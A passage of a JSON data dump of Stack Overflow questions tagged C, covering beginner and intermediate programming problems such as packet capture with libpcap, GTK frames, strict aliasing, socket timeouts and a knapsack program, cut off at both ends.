errbuf);\n    exit(EXIT_FAILURE);\n}\n\n/* make sure we're capturing on an Ethernet device*/\nif (pcap_datalink(handle) != DLT_EN10MB) {\n    fprintf(stderr, \"%s is not an Ethernet\\n\", dev);\n    exit(EXIT_FAILURE);\n}\n\n/* compile the filter expression */\nif (pcap_compile(handle, &amp;fp, filter_exp, 0, 0) == -1) {\n    fprintf(stderr, \"Couldn't parse filter %s: %s\\n\",\n        filter_exp, pcap_geterr(handle));\n    exit(EXIT_FAILURE);\n}\n\n/* apply the compiled filter */\nif (pcap_setfilter(handle, &amp;fp) == -1) {\n    fprintf(stderr, \"Couldn't install filter %s: %s\\n\",\n        filter_exp, pcap_geterr(handle));\n    exit(EXIT_FAILURE);\n}\n\npcap_loop(handle, -1, gotPacket, NULL);\n\npcap_freecode(&amp;fp);\npcap_close(handle);\n\nprintf(\"\\nCapture complete.\\n\");\n\nreturn(0);\n}\n</code></pre>\n\n<p>The got packet function just prints out the payload of the packet;  The output is just:</p>\n\n<pre><code>Filter expression: ip\n\nCapture complete.\n</code></pre>\n"},{"tags":["c","gtk","frame","gtk3"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":13001990,"title":"Why is there no a border on this GtkFrame?","body":"<p>I'm reading tutorials on <code>GtkFrame</code>, I have compile some code examples, but unlike screnhoot of the tutorial, but my program using <code>GtkFrame</code> don't have a border. </p>\n\n<p>The following code:</p>\n\n<pre><code>#include &lt;gtk/gtk.h&gt;\n\nint main( int   argc,\n          char *argv[] )\n{\n  /* GtkWidget is the storage type for widgets */\n  GtkWidget *window;\n  GtkWidget *frame;\n  GtkWidget *button;\n  GtkWidget *label;\n  gint i;\n\n  /* Initialise GTK */\n  gtk_init(&amp;argc, &amp;argv);\n\n  /* Create a new window */\n  window = gtk_window_new (GTK_WINDOW_TOPLEVEL);\n  gtk_window_set_title(GTK_WINDOW(window), \"Frame Example\");\n\n  /* Here we connect the \"destroy\" event to a signal handler */ \n  g_signal_connect (G_OBJECT (window), \"destroy\",\n                      G_CALLBACK (gtk_main_quit), NULL);\n\n  gtk_widget_set_size_request(window, 300, 300);\n  /* Sets the border width of the window. */\n  gtk_container_set_border_width (GTK_CONTAINER (window), 10);\n\n  label = gtk_label_new(\"foo\");\n\n  /* Create a Frame */\n  frame = gtk_frame_new(NULL);\n  gtk_container_add(GTK_CONTAINER(frame), label);\n  gtk_widget_set_size_request(frame, 30, 30);\n\n  gtk_container_add(GTK_CONTAINER(window), frame);\n\n  /* Set the frame's label */\n  gtk_frame_set_label( GTK_FRAME(frame), \"GTK Frame Widget\" );\n\n  /* Set the style of the frame */\n  gtk_frame_set_shadow_type( GTK_FRAME(frame), GTK_SHADOW_ETCHED_OUT);\n\n  gtk_widget_show(frame);\n\n  /* Display the window */\n  gtk_widget_show (window);\n\n  /* Enter the event loop */\n  gtk_main ();\n\n  return(0);\n}\n/* example-end */\n</code></pre>\n\n<p>Generate the program:</p>\n\n<p><img src=\"http://i.stack.imgur.com/eRkre.png\" alt=\"enter image description here\"></p>\n\n<p>What am I missing?</p>\n"},{"tags":["c++","c"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":90,"score":0,"question_id":13266225,"title":"Assigning value to pointer throws exception","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/164194/why-do-i-get-a-segmentation-fault-when-writing-to-a-string\">Why do I get a segmentation fault when writing to a string?</a>  </p>\n</blockquote>\n\n\n\n<p>I am new to C/C++, I'm trying to learn it, I have created the following function but it throws an exception, when I'm trying to assign the uppercase value to *string: Unhandled exception at 0x00411820 in CPP1.exe: 0xC0000005: Access violation writing location 0x00417754.</p>\n\n<pre><code>void ToUpper(char* string)\n{\n    while(*string != '\\0')\n    {\n        if(*string &gt;= 97 &amp;&amp; *string &lt;= 122)\n        {\n            int symbol = *string;\n            *string = symbol - 32;\n        }\n        string++;\n    }\n}\n</code></pre>\n\n<p>Usage:</p>\n\n<pre><code>char* x = \"text\"; \nToUpper(x); \n</code></pre>\n\n<p>Could you please help me?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":65,"score":3,"question_id":13265808,"title":"A clarification in bitwise operators","body":"<p>I have been performing bitwise operation on a variable.</p>\n\n<pre><code>int p=3,q=5;\nint a=~p,b=~q; //complement a and b\nprintf(\"%d %d\\t%d %d\",p,a,q,b);\n</code></pre>\n\n<p>The theoretical output for 'b' is 10 and in case if it's signed, it has to be -2. \nBut the output is -6. </p>\n\n<p>Can someone explain me the working of it? </p>\n"},{"tags":["c","linux","openwrt"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13265678,"title":"Does the libubox supports multithreads","body":"<p>I m working on a project using libubox. And I have remarked that libubox execute functions in sequentiel mode and not in multthread mode.</p>\n\n<p>Are there some one who could confirm this?</p>\n"},{"tags":["c++","c","performance","gcc","sse"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13267354,"title":"segmentation fault in SSE when -O3 is on","body":"<p>I found a very strange behaviour when using gcc's <strong><em>-O3</em></strong> or <strong><em>-O2</em></strong>  option.</p>\n\n<p>When my program is running under debug mode (<strong><em>-g</em></strong>), it is fine; but it raises a segmentation fault when I turned on <strong><em>-O3</em></strong> or <strong><em>-O2</em></strong>.</p>\n\n<p>The segmentation happens when it is running a function with <strong>SSE2</strong> macro inside; like</p>\n\n<pre><code>_m128i polynomial = _mm_set1_epi8(0x1d)\n</code></pre>\n\n<p>This is only part of the code.</p>\n\n<p>I think I have already eliminate the situation of address alignment on 16 bytes. It's so wired that the -g mode and the <strong><em>-O2</em></strong> or <strong><em>-O3</em></strong> mode behaves differently.</p>\n\n<p>Actually, I am not sure the bug is related to SSE2 or not.</p>\n\n<p>I am using <strong><em>gcc 4.4.3</em></strong>.</p>\n\n<p><strong>Have you encountered the same problem?</strong></p>\n\n<p><strong>Or can you gave me some suggestion on how to deal with it?</strong></p>\n"},{"tags":["c","compiler"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":55,"score":-1,"question_id":13267362,"title":"is it possible to compile a program for different operating systems using gcc in linux?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/6478788/running-linux-gcc-compiled-program-under-windows\">Running linux gcc-compiled program under windows</a>  </p>\n</blockquote>\n\n\n\n<p>I am using ubuntu 12.04 which already has gcc compiler. Is it possible to compile a program in ubuntu 12.04 using gcc so that the executable can run on windows? If it is possible please tell me how to? Else please provide me the reasons.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c","gcc","strict-aliasing"],"answer_count":5,"favorite_count":9,"up_vote_count":14,"down_vote_count":1,"view_count":2896,"score":13,"question_id":2958633,"title":"gcc, strict-aliasing, and horror stories","body":"<p>In <a href=\"http://stackoverflow.com/questions/2906365/gcc-strict-aliasing-and-casting-through-a-union\">http://stackoverflow.com/questions/2906365/gcc-strict-aliasing-and-casting-through-a-union</a> I asked whether anyone had encountered problems with union punning through pointers.  So far, the answer seems to be <em>No</em>.</p>\n\n<p>This question is broader: do you have <em>any</em> horror stories about gcc and strict-aliasing?</p>\n\n<p>Background: Quoting from AndreyT's answer in <a href=\"http://stackoverflow.com/questions/2771023/c99-strict-aliasing-rules-in-c-gcc/2771041#2771041\">http://stackoverflow.com/questions/2771023/c99-strict-aliasing-rules-in-c-gcc/2771041#2771041</a>:</p>\n\n<blockquote>\n  <p>\"Strict aliasing rules are rooted in parts of the standard that were present in C and C++ since the beginning of [standardized] times. The clause that prohibits accessing object of one type through a lvalue of another type is present in C89/90 (6.3) as well as in C++98 (3.10/15). ... It is just that not all compilers wanted (or dared) to enforce it or rely on it.\"</p>\n</blockquote>\n\n<p>Well, <strong>gcc</strong> is now daring to do so, with its <code>-fstrict-aliasing</code> switch.  And this has caused some problems.  See, for example, the excellent article  <a href=\"http://davmac.wordpress.com/2009/10/\" rel=\"nofollow\">http://davmac.wordpress.com/2009/10/</a> about a Mysql bug, and the equally excellent discussion in <a href=\"http://cellperformance.beyond3d.com/articles/2006/06/understanding-strict-aliasing.html\" rel=\"nofollow\">http://cellperformance.beyond3d.com/articles/2006/06/understanding-strict-aliasing.html</a>.</p>\n\n<p>Some other less-relevant links:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/1225741/performance-impact-of-fno-strict-aliasing\">http://stackoverflow.com/questions/1225741/performance-impact-of-fno-strict-aliasing</a><br>\n<a href=\"http://stackoverflow.com/questions/754929/strict-aliasing\">http://stackoverflow.com/questions/754929/strict-aliasing</a><br>\n<a href=\"http://stackoverflow.com/questions/262379/when-is-char-safe-for-strict-pointer-aliasing\">http://stackoverflow.com/questions/262379/when-is-char-safe-for-strict-pointer-aliasing</a><br>\n<a href=\"http://stackoverflow.com/questions/725138/how-to-detect-strict-aliasing-at-compile-time\">http://stackoverflow.com/questions/725138/how-to-detect-strict-aliasing-at-compile-time</a>  </p>\n\n<p>So to repeat, do you have a horror story of your own?  Problems <strong><em>not</em></strong> indicated by <code>-Wstrict-aliasing</code> would, of course, be preferred.  And other C compilers are also welcome.</p>\n\n<p><em><strong>Added June 2nd</em></strong>:  The first link in Michael Burr's answer, which does <strong><em>indeed</em></strong> qualify as a horror story, is perhaps a bit dated (from 2003).  I did a quick test, but the problem has apparently gone away.</p>\n\n<p>Source:</p>\n\n<pre><code>#include &lt;string.h&gt;\nstruct iw_event {               /* dummy! */\n    int len;\n};\nchar *iwe_stream_add_event(\n    char *stream,               /* Stream of events */\n    char *ends,                 /* End of stream */\n    struct iw_event *iwe,       /* Payload */\n    int event_len)              /* Real size of payload */\n{\n    /* Check if it's possible */\n    if ((stream + event_len) &lt; ends) {\n            iwe-&gt;len = event_len;\n            memcpy(stream, (char *) iwe, event_len);\n            stream += event_len;\n    }\n    return stream;\n}\n</code></pre>\n\n<p>The specific complaint is:</p>\n\n<blockquote>\n  <p>Some users have complained that when the [above] code is compiled without the -fno-strict-aliasing, the order of the write and memcpy is inverted (which means a bogus len is mem-copied into the stream).</p>\n</blockquote>\n\n<p>Compiled code, using <strong>gcc</strong> 4.3.4 on CYGWIN wih -O3 (please correct me if I am wrong--my assembler is a bit rusty!):</p>\n\n<pre><code>_iwe_stream_add_event:\n        pushl       %ebp\n        movl        %esp, %ebp\n        pushl       %ebx\n        subl        $20, %esp\n        movl        8(%ebp), %eax       # stream    --&gt; %eax\n        movl        20(%ebp), %edx      # event_len --&gt; %edx\n        leal        (%eax,%edx), %ebx   # sum       --&gt; %ebx\n        cmpl        12(%ebp), %ebx      # compare sum with ends\n        jae L2\n        movl        16(%ebp), %ecx      # iwe       --&gt; %ecx\n        movl        %edx, (%ecx)        # event_len --&gt; iwe-&gt;len (!!)\n        movl        %edx, 8(%esp)       # event_len --&gt; stack\n        movl        %ecx, 4(%esp)       # iwe       --&gt; stack\n        movl        %eax, (%esp)        # stream    --&gt; stack\n        call        _memcpy\n        movl        %ebx, %eax          # sum       --&gt; retval\nL2:\n        addl        $20, %esp\n        popl        %ebx\n        leave\n        ret\n</code></pre>\n\n<p>And for the second link in Michael's answer,</p>\n\n<pre><code>*(unsigned short *)&amp;a = 4;\n</code></pre>\n\n<p><strong>gcc</strong> will usually (always?) give a warning.  But I <em>believe</em> a valid solution to this (for <strong>gcc</strong>)  is to use:</p>\n\n<pre><code>#define CAST(type, x) (((union {typeof(x) src; type dst;}*)&amp;(x))-&gt;dst)\n// ...\nCAST(unsigned short, a) = 4;\n</code></pre>\n\n<p>I've asked SO whether this is OK in <a href=\"http://stackoverflow.com/questions/2906365/gcc-strict-aliasing-and-casting-through-a-union\">http://stackoverflow.com/questions/2906365/gcc-strict-aliasing-and-casting-through-a-union</a>, but so far nobody disagrees.</p>\n"},{"tags":["c","parallel-processing","embedded","at-command"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13266359,"title":"AT commands in embedded systems","body":"<p>I am using embedded C and trying to make application for GPRS terminal. My main problem is working with AT commands. I send AT command using serial line, but if it is some network oriented command its response could take time and because of that I have a lot of waiting, while processor don`t do anything. Idea is to make this waiting to be done in same way parallel like in different thread. Does anyone have idea how to do that because my system does not support threads? \n  I had idea to use some timers, because we have interrupt which is called every 5ms, but I don't know ho many seconds I have to wait for response, and if I compare strings in interrupt to check if all message is received it could be very inefficient, right?</p>\n"},{"tags":["c++","c","file","handles"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":13200079,"title":"How can I append to a text file?","body":"<p>I have a program written in C++ which accepts text from a user and saves it to a text file using file handles.  Here are snippets of the program:</p>\n\n<p>The program works fine.  The only problem with it is that it does not append the text to the text file.  Rather, it \"removes\" all the existing text and only saves the new text.</p>\n\n<p>That is, the text saved in a previous session of the program is discarded and the new text is saved instead.  How can I solve this problem please?</p>\n"},{"tags":["c","linux","system-programming"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13256948,"title":"gdb like printing of a pointer to a struct","body":"<p>I need a way to have gdb like output for a pointer to a structure which shows all the fields and its addresses and the corresponding values. Is there a clean way to do this instead of printing it member by member. I cannot use any other external tool like pstruct or libgdb. I want to do it from within our C program. I do have gdb on the system and can use it. Thanks for your time.</p>\n"},{"tags":["iphone","c","xcode4","rpn"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":61,"score":-1,"question_id":13265822,"title":"RPN calculator for iPhone","body":"<p>I have an assignment to do a calculator based on RPN algorithm. What I did is I created a single view application and added one .c file to the project. I wrote the code for converting an infix expression to postfix expression in that file. Also I added the code for evaluating a postfix expression in that file. From my view controller file I am just passing the infix expression. The code for passing infix expression is like this</p>\n\n<pre><code>NSString *infix=@\"11+4\";    \nconst char *cInfix = [s cStringUsingEncoding:NSUTF8StringEncoding];  \nconversion(cInfix); \n</code></pre>\n\n<p>The result of this expression is 5 instead of 15.The problem is, the code is evaluating only single digit numbers. How can I improve the code so that it will evaluate multi digit numbers. Help would be appreciated, I've been in search for this for the past one week.</p>\n\n<p>My C file code for conversion to post fix expression is giving below:</p>\n\n<pre><code>int conversion(const char *infix )\n{\nint i=0,j=0,k=0,length;\nchar temp;\n//printf(\"\\nEnter an infix expression:\");\n//scanf(\"%s\",infix);\n //  printf(\"\\nThe infix expresson is %s\",infix);\n\n//char string[300];\n//strcpy(string, infix);   \n\n// tokenize(string);\n\n//char *p = strtok(string, \"+\");\n//  printf(\"token=%s\",p);\n\nlength=strlen(infix);\nfor(i=0;i&lt;length;i++)\n{\n    //Numbers are added to the out put QUE\n    if(infix[i]!='+' &amp;&amp; infix[i]!='-' &amp;&amp; infix[i]!='*' &amp;&amp; infix[i]!='/' &amp;&amp; infix[i]!='^' \n  &amp;&amp; infix[i]!=')' &amp;&amp; infix[i]!='(' )\n    {\n        output[j++]=infix[i];\n        printf(\"\\nThe element added to Q is:%c\",infix[i]);\n    }\n    //If an operator or a bracket is encountered...\n    else\n    {\n        if(tos==0) //If there are no elements in the stack, the operator is added to it\n        {\n            push(infix[i]);\n            printf(\"\\nThe pushed element is:%c\",infix[i]);\n        }\n        else\n        {       //Operators or pushed or poped based on the order of precedence\n            if(infix[i]!=')' &amp;&amp; infix[i]!='(')\n            {\n                if(    prec(infix[i]) &lt;= prec(stack[tos-1])  )\n                {\n                    temp=pop();\n                    printf(\"\\n the poped element is :%c\",temp);\n                    output[j++]=temp;\n                    push(infix[i]);\n                    printf(\"\\n The pushed element is :%c\",infix[i]);\n                    show();\n                }\n                else\n                {\n                    push(infix[i]);\n                    printf(\"\\nThe pushed element is:%c\",infix[i]);\n                    show();\n                }\n            }\n            else\n            {\n                if(infix[i]=='(')\n                {\n                    push(infix[i]);\n                    printf(\"\\nThe pushed-- element is:%c\",infix[i]);\n                }\n                if(infix[i]==')')\n                {\n                    temp=pop();\n                    while(temp!='(')\n                    {output[j++]=temp;\n                        printf(\"\\nThe element added to Q is:%c\",temp);\n                        //temp=pop();\n                        printf(\"\\n the poped element is :%c\",temp);\n                        temp=pop();}\n                }\n            }\n\n        }\n\n    }   \n\n    printf(\"\\nthe infix expression is: %s\",output);        \n}\nwhile(tos!=0)\n{\n    output[j++]=pop();\n    printf(\"\\noutput j=%d value==%c\",(j-1),output[j-1]);\n}\nevaluation(output);\nprintf(\"the postfix expression is: %s\\n\",output);\nreturn 1;\n\n}\n</code></pre>\n"},{"tags":["c","struct","initialization","arm"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":58,"score":-1,"question_id":13264753,"title":"Initialization of global structure in C (GCC 4.5.2)","body":"<p>I am writing a code in C for STM32 using CodeSourcery GCC 4.5.2 for ARM. I am facing problems in initialization of a global structure. The code is given below. </p>\n\n<p>In struct.h</p>\n\n<pre><code>typedef struct\n{\n  int foo;\n  ...\n  int bar;\n} mystruct;\n\nextern mystruct example; \n</code></pre>\n\n<p>In struct.c</p>\n\n<pre><code>mystruct example = {100,200 ..., 1000};\n</code></pre>\n\n<p>In Main.c</p>\n\n<pre><code>#include \"struct.h\"\n\nint temp;\ntemp = example.foo;\n</code></pre>\n\n<p>The code compiles without any problems. But while debugging, I find that the structure has been initialized with all garbage values!! The value of temp should be 100 but it always turns out to be a garbage value. I am using eclipse + openOCD + GDB hardware debugging at the PC and Olimex JTAG on the hardware end. </p>\n\n<p>Is this a problem of the compiler? Or am I missing something here?</p>\n"},{"tags":["c","perl","graph"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13257626,"title":"Graph library that supports edge labels","body":"<p>I stumbled across <a href=\"http://search.cpan.org/~jhi/Graph-0.94/lib/Graph.pod\" rel=\"nofollow\">Perl's Graph library</a> this morning. I used to write a quick program to find all (weakly) connected components in a directed graph. Here is the program.</p>\n\n<pre><code>use strict;\nuse Graph;\nuse Data::Dumper;\n\nmy $g = Graph-&gt;new();\nforeach my $file(@ARGV)\n{\n  open(my $IN, \"&lt;\", $file) or die(\"cannot open '$file'\");\n  while(my $line = &lt;$IN&gt;)\n  {\n    chomp($line);\n    my($source, $target, $edge_label) = split(/\\t/, $line);\n    $g-&gt;add_edge($source, $target);\n  }\n  close($IN);\n}\n\nmy @clusters = $g-&gt;weakly_connected_components();\nprint Dumper(\\@clusters);\n</code></pre>\n\n<p>...and the input data files look like this.</p>\n\n<pre><code>n1  n2  some_data_encoded_in_a_label\nn1  n3  some_data_encoded_in_a_label\nn4  n5  some_data_encoded_in_a_label\n...\n</code></pre>\n\n<p>...where the first column is the source node label, the second column is the target node label, and the third column is an edge label. I have a couple of data files, each with tens of thousands of edges.</p>\n\n<p>This quick-n-dirty script got the job done, but there were a few things that would have been nice to have.</p>\n\n<ul>\n<li>The connected components returned by the <strong>weakly_connected_components</strong> method were simply arrays of node labels, so the connections between these nodes is lost.</li>\n<li>Even if the method returned a set of nodes <em>and</em> a set of edges, the library does not permit storage of labels or data associated with each edge, which is inconvenient.</li>\n</ul>\n\n<p>Are there any alternative graph libraries that include either or both of these features? The language of implementation is not very important--I'm open to C/C++, Python, Perl, R, etc.</p>\n"},{"tags":["c","algorithm","graph-theory"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":13251206,"title":"Graph Theory - Fill nodes with a limited number of routes","body":"<p>First I must say this is not a Homework or something related, this is a problem of a game named (freeciv).</p>\n\n<p>Ok, in the game we have 'n' number of cities usually (8-12), each city can have a max number of trade-routes of 'k' usually (4), and those trade-routes need to be 'd' distance or further (8 Manhattan tiles).</p>\n\n<p>The problem consist in to find the k*n trade-routes with (max distances or min distances), obviously this problem can be solved with a brute-force algorithm but it is really slow when you the player have more than 10 cities because the program has to make several iterations; I tried to solve it using graph theory but I am not an not an expert in it, I even asked some of my teachers and none could explain me an smart-algorithm, so I didn't come here to find the exact solution but I did to get the idea or the steps to analyze this.</p>\n\n<p><img src=\"http://i.stack.imgur.com/CIwKs.jpg\" alt=\"Problem Description\"></p>\n\n<p><img src=\"http://i.stack.imgur.com/1rH6O.jpg\" alt=\"Graph Part\"></p>\n"},{"tags":["c","networking","sockets","network-programming"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":4167,"score":4,"question_id":1824465,"title":"Set timeout for winsock recvfrom","body":"<p>I'm trying to set up a blocking socket to timeout after 16 ms of trying to recvfrom() on a port.  Platform is Windows.  I've looked at tons of examples online and it seems really simple I just can't seem to get it to work.  Any help would be appreciated!</p>\n\n<pre><code>#include &lt;winsock2.h&gt;\n#include &lt;string&gt;\n\n#pragma comment(lib, \"ws2_32.lib\")\n\n#define PORT_NUM 8001\n\nint main(void)\n{\n  std::string localIP;\n  sockaddr_in localAddr;\n  sockaddr_in remoteAddr;\n  hostent* localhost;\n  char buffer[1024];\n  WSADATA wsData;\n\n  int result = WSAStartup(MAKEWORD(2,2), &amp;wsData);  // winsock version 2\n\n  localhost = gethostbyname(\"\");\n  localIP   = inet_ntoa(*(in_addr*)*localhost-&gt;h_addr_list);\n\n  localAddr.sin_family       = AF_INET;\n  localAddr.sin_port         = htons(PORT_NUM);             // Set Port Number\n  localAddr.sin_addr.s_addr  = inet_addr(localIP.c_str());  // Set IP Address\n\n  int mHandle = WSASocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP, NULL, 0, 0);\n\n  if(mHandle == INVALID_SOCKET)\n    return 1;\n\n\n  if(bind(mHandle, (SOCKADDR*)&amp;localAddr, sizeof(localAddr)) == SOCKET_ERROR)\n    return 1;\n\n  timeval tv;\n  tv.tv_sec  = 0;\n  tv.tv_usec = 1600;\n\n    // Set Timeout for recv call\n  if(setsockopt(mHandle, SOL_SOCKET, SO_RCVTIMEO, \n                reinterpret_cast&lt;char*&gt;(&amp;tv), sizeof(timeval)))\n    return 1;\n\n  int length = sizeof(remoteAddr);\n\n  // &lt;-- Blocks here forever\n  recvfrom(mHandle, buffer, 1024, 0, (SOCKADDR*)&amp;remoteAddr, &amp;length);  \n\n  return 0;\n}\n\n/*  I've also tried passing the time like so:\nint ms = 16;\n\nif(setsockopt(mHandle, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast&lt;char*&gt;(&amp;ms), sizeof(int)))\n  return 1; */\n</code></pre>\n"},{"tags":["java","c","jni"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13266069,"title":"Getting data of a direct buffer object returned from JNI method to Java?","body":"<p>I am new to JNI and struggling to implement one requirement.  I have\nallocated direct buffer in JNI using <code>NewDirectByteBuffer()</code> API and\nwant to access the buffer on Java side.  </p>\n\n<p>What I did is I have allocated a native memory and stored some data in that buffer.Then I wrapped that memory space in a direct buffer object using <code>NewDirectByteBuffer()</code> API. </p>\n\n<p>Then to read the data at that memory from JAVA, I returned that direct buffer object(<code>BufferObject</code>) to java side and read using <code>BufferObject.get()</code> method.</p>\n\n<p>But cannot managed to get the data i stored in the direct buffer.Please let me is that way correct to read data of a direct buffer object which was created using <code>NewDirectByteBuffer()</code>?</p>\n"},{"tags":["c++","c","math","bezier-curve","curve"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":11592555,"title":"Shortest distance to the cardinalspline spline curve from the outside point in c++","body":"<p>I need to find shortest distance from any given point outside of the curve to cardinalspline curve\n Can I have any reference link or any equations can help me on this.\nfollowing is the reference link the way i want to implement</p>\n\n<p>Thanks \nnikhil</p>\n"},{"tags":["c","data-structures"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13256675,"title":"Need to find whether a number already exists in any of given ranges","body":"<p>I have multiple ranges configured which can increase/decrease dynamically, I need to find the fastest way to find whether a given number exists is any of the ranges, if yes then return the range? Can someone please suggest me the fastest algorithm or data structure in C to do such an operation? </p>\n\n<p>The Code snippet is as follows:</p>\n\n<pre><code>addr = GET_U32BIT(buf);\n\n    /* Search for the corresponding address */\n    while(i &lt; addr_table_size)\n    {\n        if((addr &gt;= ntohl(table-&gt;addr_id[i].start_addr)) &amp;&amp; \\\n                (addr &lt;= ntohl(table-&gt;addr_id[i].end_addr)))\n        {\n            addr_present = 1;\n            range_id = i;\n            break;          \n        }\n        i++;\n    }\n</code></pre>\n\n<p>In the above code, addr is a 4 byte number that is derived from a buffer received at runtime, while doing a linear search in a table where start and end addr are stored, the performance is very low as table can have around 50,000 to 100,000 entries.</p>\n\n<p>Thanks</p>\n"},{"tags":["c","string"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":13265761,"title":"How do I reverse a string (not in place) in C?","body":"<p>I've searched, but all I can find is where a function to reverse a string in place. Here's what I have so far:</p>\n\n<pre><code>char* reverseString(char* string)\n{\n    int i, j;\n    char reversed[sizeof(string)];\n    j = strlen(string);\n\n    for (i = strlen(string); i &gt;= 0; i--)\n    {\n        reversed[j - i] = string[i];\n    }\n    return reversed;\n}\n</code></pre>\n\n<p>However, that hits the issue of reversed being a local variable, so returning a pointer to it throws </p>\n\n<pre><code>warning: function returns address of local variable [enabled by default]\n</code></pre>\n"},{"tags":["c","http","protocols"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":16,"score":-1,"question_id":13265485,"title":"extract coap query","body":"<p>I need your help in extracting the query value in a coap message.The coap message looks like</p>\n\n<pre><code>coap://[ff08:90:5001:0:0:0:0:1]:12345/c?a=4 \n</code></pre>\n\n<p>decoded packet is <code>52 02 00 00 91 63 63 61 3d 34</code> . Here <code>63 61 3d 34</code> is the query part <code>?a=4</code> . There is a data after query. I have pointed my buffer pointer to 63(?), now I'm struck in getting the value 34(4). How do I go to the value and extract it?</p>\n\n<pre><code>coap_h *hdr = (coap_h *)(buf);\n\nbuf = (uint8_t *)(hdr + 1);\nlen = buf[0] &amp; 0xf;\nbuf += len + 1;\n</code></pre>\n\n<p>buf points to <code>52</code> initially and then I move the buf to the options field <code>91</code> and check for length then increment the buf which points to <code>63</code> (?). hope i'm clear this time.</p>\n"},{"tags":["c++","c","osx"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13261774,"title":"List all symbols in a dylib","body":"<p>As the title says Im trying to list all the symbols inside a dylib in order to know which one needs to be updated inside my app (as my app store all links to function as well as their name , to create a dynamic module mechanism that auto detect/update functions automatically at runtime).</p>\n\n<p>Basically what Im searching for is similar as what the nm command do but in code (and not by launching nm on the console then get the output and parse).</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["c","struct","enums","arm","cortex-m3"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13265815,"title":"ARM: fromelf - switches to get enum adresses in text output","body":"<p>i use this command:</p>\n\n<pre><code>fromelf.exe -a project.axf &gt; output.txt\n</code></pre>\n\n<p>to know my storage adresses in the Cortex-M3. \nAll structs are listed there, with all flash and Ram adresses. \nHow can i output the enums ?\nI think they are all in the .axf - File? Axf = elf?!\nThx</p>\n"},{"tags":["c","linux","linux-kernel","kernel-module"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":177,"score":1,"question_id":11031554,"title":"kernel module parameters changes (using /sys/module)","body":"<p>I have some questions concerning the /sys/module/ in linux</p>\n\n<p>1) Does the /sys/module contain all modules of kernel</p>\n\n<p>2)  Does the /sys/module/xxx/parameters contains all parameters of the kernel module xxxx</p>\n\n<p>3) Does the /sys/module/xxx/parameters/yyyy contain realtime values of the parameter yyyy of the kernel module xxxx</p>\n\n<p>4) if a parameter is changed in a giving kernel module, how to detect this change in RealTime? I want to develop a C application (user space) or a shell script which detect the change of a giving kernel module parameter in real time.</p>\n"},{"tags":["c","knapsack-problem"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":3670,"score":4,"question_id":8200262,"title":"This C code for a dynamic programming solution to the 0/1 Knapsack Problem‍​​ doesn't give the correct output with GCC. Why?","body":"<pre><code>#include&lt;stdio.h&gt;\n\nint max(int a,int b)\n{\n    if(a&gt;b)\n        return a;\n    else\n        return b;\n}\n\nvoid knapsack(int m,int n,int w[],int p[])\n{\n    int v[10][10],x[10],i,j;\n    for(i=0;i&lt;=n;i++)\n    {\n        for(j=0;j&lt;=m;j++)\n        {\n            if(j==0||i==0)\n                v[i][j]=0;\n            if(j-w[i]&lt;0)\n                v[i][j]=v[i-1][j];\n            else\n                v[i][j]=max(v[i-1][j],v[i-1][j-w[i]]+p[i]);\n        }\n    }\n    for(i=0;i&lt;=n;i++)\n    {\n        for(j=0;j&lt;=m;j++)\n            printf(\"%d\\t\",v[i][j]);\n        printf(\"\\n\");\n    }\n    printf(\"THE OPTIMAL SOLUTION IS:%d\",v[n][m]);\n    for(i=1;i&lt;=n;i++)\n        x[i]=0;\n    i=n;\n    j=m;\n    while(i&gt;0 &amp;&amp; j&gt;0)\n    {\n        if(v[i][j]!=v[i-1][j])\n        {\n            x[i]=1;\n            j=j-w[i];\n        }\n        i--;\n    }\n    printf(\"THE OPTIMAL SET OF WEIGHTS IS:\");\n    for(i=1;i&lt;=n;i++)\n        if(x[i]==1)\n            printf(\"%d\\t\",i);\n    printf(\"\\n\");\n}\n\nint main()\n{\n    int w[10],p[10],i,m,n;\n    printf(\"ENTER THE NUMBER OF ITEMS:\");\n    scanf(\"%d\",&amp;n);\n    printf(\"ENTER THE 